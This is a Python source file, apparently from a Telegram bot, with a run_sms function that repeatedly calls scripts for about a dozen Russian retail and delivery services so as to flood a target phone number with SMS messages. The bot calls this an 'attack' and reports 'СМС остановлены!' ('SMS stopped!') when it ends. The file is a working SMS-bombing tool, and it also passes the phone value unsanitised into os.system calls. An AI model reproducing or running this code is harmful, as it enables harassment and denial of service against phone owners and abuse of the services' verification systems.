import requests

import utilities

import telebot

from threading import Thread

import time

import config

import os
import sys


def run_sms(phone, userid):

    while True:

        os.system("python3 services/uber.py " + phone[1:-1])

        time.sleep(2)

        os.system("python3 services/aptekaapril.py " + phone)

        time.sleep(2)

        os.system("python3 services/citymobil.py " + phone)

        time.sleep(2)

        os.system("python3 services/kari.py " + phone)

        time.sleep(2)

        os.system("python3 services/mvideo.py " + phone)

        time.sleep(2)

        os.system("python3 services/perekrestok.py " + phone)

        time.sleep(2)

        os.system("python3 services/sravni.py " + phone)

        time.sleep(2)

        os.system("python3 services/citilink.py " + phone)

        time.sleep(2)

        os.system("python3 services/icq.py " + phone)

        time.sleep(2)

        os.system("python3 services/yandexfood.py " + phone)

        time.sleep(2)

        os.system("python3 services/sdravcity.py " + phone[1:-1])

        time.sleep(2)

        os.system("python3 services/vkusvill.py " + phone)

        if not utilities.is_attack_running(userid):
            bot = telebot.TeleBot(config.bot_token)
            bot.send_message(userid, "СМС остановлены!")
            return 0
